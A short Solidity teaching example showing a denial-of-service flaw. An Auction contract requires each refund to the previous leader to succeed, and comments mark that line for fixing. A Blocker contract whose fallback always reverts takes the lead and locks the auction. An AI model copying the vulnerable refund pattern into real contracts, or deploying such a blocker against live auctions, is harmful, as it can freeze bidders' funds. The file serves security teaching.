// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.5.0;

contract Auction {
    address payable currentLeader;
    uint highestBid;

    function bid() public payable{
        require(msg.value > highestBid);
        // change this line to fix
        // currentLeader.send(highestBid);
        require(currentLeader.send(highestBid));
        // ^ this one
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Blocker {
    Auction auction;

    constructor(Auction a) public{
        auction = a;
    }

    function block() public payable{
        auction.bid.value(msg.value)();
    }

    function() external payable{
        revert();
    }
}